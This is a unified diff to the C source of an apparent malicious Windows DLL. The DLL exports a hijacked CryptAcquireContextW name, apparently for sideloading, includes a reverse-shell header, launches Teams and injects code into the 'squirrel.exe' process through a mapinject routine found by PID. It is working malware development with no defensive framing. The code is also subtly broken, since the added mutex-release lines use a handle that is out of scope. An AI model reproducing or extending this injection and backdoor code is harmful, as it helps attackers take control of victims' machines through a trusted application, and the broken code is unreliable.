@@ -4,6 +4,7 @@
 
 #include "mapinject.h"
 #include "reverse_shell.h"
+#include "pidhandler.h"
 
 // Constants
 #define PSIZE 1024
@@ -18,7 +19,7 @@
 
 */
 
-// Mutex management
+// Mutex management to prevent double execution
 void checkMutex() {
     HANDLE hMutex = CreateMutex(NULL, FALSE, MUTEX_NAME);
     if (hMutex != NULL) {
@@ -27,9 +28,6 @@ void checkMutex() {
             CustomExitProcess();
         }
     }
-
-    ReleaseMutex(hMutex);
-    CloseHandle(hMutex);
 }
 
 /*
@@ -189,5 +187,18 @@ __declspec(dllexport) void CryptAcquireContextW() {
     execute_Teams();
 
     // Inject process
-    mapinject();
+    // Call GetPID to get the PID of "squirrel.exe"
+    int PID = GetPID("squirrel.exe");
+
+    // Check if the PID is valid (not 0, indicating a failure)
+    if (PID != 0) {
+        // Call mapinject with the obtained PID
+        mapinject(PID);
+    } else {
+        ExitProcess(1);
+    }
+
+    // Mutex release
+    ReleaseMutex(hMutex);
+    CloseHandle(hMutex);
 }
